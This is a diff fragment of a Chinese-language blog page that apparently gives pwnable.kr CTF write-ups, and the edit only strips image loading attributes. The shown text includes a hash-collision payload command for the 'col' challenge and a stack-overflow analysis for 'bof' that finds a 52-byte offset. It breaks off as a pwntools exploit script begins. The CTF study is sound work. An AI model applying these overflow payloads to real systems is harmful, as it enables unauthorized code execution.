@@ -261,7 +261,7 @@ int main(int argc, char* argv[]){
     return 0;
 }</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p>
 <p>col@pwnable:<del>$ ./col $(python -c “print ‘\x01’ *16+ ‘\xE8\x05\xD9\x1D’”)<br>daddy! I just managed to create a hash collision :)<br>col@pwnable:</del>$ </p>
-<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" srcset="/img/loading.gif" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" srcset="/img/loading.gif" alt=""><br><img src="/img/25.png" srcset="/img/loading.gif" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" srcset="/img/loading.gif" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p>
+<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" alt=""><br><img src="/img/25.png" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p>
 <pre><code>from pwn import *
 
 r = remote(&#39;pwnable.kr&#39;,&#39;9000&#39;)
